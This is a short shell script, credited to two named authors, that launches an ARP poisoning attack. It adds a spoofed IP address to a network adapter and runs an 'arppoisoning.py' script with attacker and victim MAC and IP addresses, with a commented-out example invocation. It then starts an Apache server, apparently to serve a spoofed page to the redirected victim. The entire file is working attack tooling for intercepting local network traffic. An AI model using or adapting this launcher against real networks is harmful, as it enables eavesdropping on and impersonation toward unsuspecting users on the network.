# Created by Maiko Bergman and Guy Puts

# Add spoofed IP address to network adapter
sudo ip addr add 192.168.1.108 dev enp0s31f6
cd /opt/lampp/htdocs/dashboard
# Deploy ARP Poisoning Attack
# Order: macAttacker, ipAttacker, macVictim, ipVictim, interface
sudo python3 arppoisoning.py $1 $2 $3 $4 $5
#sudo python3 arppoisoning.py "18:60:24:14:0c:28" "192.168.1.196" "ac:ed:5c:57:22:68" "192.168.1.124" "enp0s31f6"
# Start Apache server
sudo /opt/lampp/lampp start
